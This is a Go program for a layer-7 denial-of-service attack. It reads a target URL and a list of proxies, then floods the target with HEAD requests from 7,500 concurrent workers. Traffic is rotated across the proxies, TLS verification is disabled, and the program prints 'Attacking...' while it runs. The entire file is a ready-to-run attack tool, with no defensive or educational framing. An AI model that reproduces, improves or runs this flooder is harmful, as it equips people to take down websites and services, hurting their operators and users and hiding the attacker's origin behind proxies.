package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	workers        = 7500
	requestTimeout = 6 * time.Second
	userAgent      = "curl/8.4.0"
)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./attacker <target> <proxyfile>")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	proxyFile := os.Args[2]
	var proxies []*url.URL
	file, _ := os.Open(proxyFile)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		pURL, err := url.Parse("http://" + strings.TrimSpace(scanner.Text()))
		if err == nil {
			proxies = append(proxies, pURL)
		}
	}
	file.Close()

	if len(proxies) == 0 {
		fmt.Println("No proxies found!")
		os.Exit(1)
	}
	clients := make([]*http.Client, len(proxies))
	for i, pURL := range proxies {
		clients[i] = &http.Client{
			Timeout: requestTimeout,
			Transport: &http.Transport{
				Proxy: http.ProxyURL(pURL),
				DialContext: (&net.Dialer{
					Timeout:   5 * time.Second,
					KeepAlive: 30 * time.Second,
				}).DialContext,
				MaxIdleConns:        5000,
				MaxIdleConnsPerHost: 5000,
				IdleConnTimeout:     60 * time.Second,
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
				ForceAttemptHTTP2:     true,
				DisableCompression:    true,
				TLSHandshakeTimeout:   4 * time.Second,
				ResponseHeaderTimeout: 4 * time.Second,
			},
		}
	}
	reqTemplate, _ := http.NewRequest("HEAD", targetURL, nil)
	reqTemplate.Header.Set("User-Agent", userAgent)
	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		client := clients[i%len(clients)]
		go func(c *http.Client) {
			defer wg.Done()
			for ctx.Err() == nil {
				req := reqTemplate.Clone(context.Background())
				resp, err := c.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}(client)
	}

	fmt.Println("Attacking... Press Ctrl+C to stop.")
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	cancel()
	wg.Wait()
	fmt.Println("Stopped.")
}
